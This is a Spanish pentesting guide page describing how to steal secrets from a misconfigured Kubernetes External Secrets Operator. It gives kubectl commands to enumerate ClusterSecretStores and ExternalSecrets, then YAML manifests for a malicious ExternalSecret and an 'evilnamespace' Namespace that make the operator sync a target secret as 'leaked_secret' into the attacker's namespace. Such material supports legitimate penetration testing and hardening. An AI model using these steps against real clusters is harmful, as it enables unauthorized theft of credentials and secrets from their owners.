# Operador de Secretos Externos

**El autor original de esta página es** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Esta página proporciona algunas indicaciones sobre cómo puedes lograr robar secretos de un ESO mal configurado o de una aplicación que utiliza ESO para sincronizar sus secretos.

## Descargo de responsabilidad

La técnica mostrada a continuación solo puede funcionar cuando se cumplen ciertas circunstancias. Por ejemplo, depende de los requisitos necesarios para permitir que un secreto se sincronice en un espacio de nombres que posees / comprometido. Debes descubrirlo por ti mismo.

## Requisitos previos

1. Un punto de apoyo en un clúster de kubernetes / openshift con privilegios de administrador en un espacio de nombres
2. Acceso de lectura al menos a ExternalSecret a nivel de clúster
3. Descubre si hay etiquetas / anotaciones requeridas o membresía de grupo necesaria que permita a ESO sincronizar tu secreto. Si tienes suerte, puedes robar libremente cualquier secreto definido.

### Recopilación de información sobre el ClusterSecretStore existente

Suponiendo que tienes un usuario con suficientes derechos para leer este recurso; comienza primero listando los _**ClusterSecretStores**_ existentes.
```sh
kubectl get ClusterSecretStore
```
### Enumeración de ExternalSecret

Supongamos que encontraste un ClusterSecretStore llamado _**mystore**_. Continúa enumerando sus externalsecret asociados.
```sh
kubectl get externalsecret -A | grep mystore
```
_Este recurso está limitado al espacio de nombres, por lo que a menos que ya sepas en qué espacio de nombres buscar, agrega la opción -A para buscar en todos los espacios de nombres._

Deberías obtener una lista de externalsecret definidos. Vamos a suponer que encontraste un objeto externalsecret llamado _**mysecret**_ definido y utilizado por el espacio de nombres _**mynamespace**_. Recopila un poco más de información sobre qué tipo de secreto contiene.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Ensamblar las piezas

Desde aquí puedes obtener el nombre de uno o varios nombres de secretos (como se define en el recurso Secret). Obtendrás una salida similar a:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
```md
* Nombre de un ClusterSecretStore
* Nombre de un ExternalSecret
* Nombre del secreto

Ahora que tenemos todo lo que necesitamos, puedes crear un ExternalSecret (y eventualmente parchear/crear un nuevo Namespace para cumplir con los requisitos necesarios para sincronizar tu nuevo secreto):
```
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Después de unos minutos, si se cumplen las condiciones de sincronización, deberías poder ver el secreto filtrado dentro de tu espacio de nombres.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referencias

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
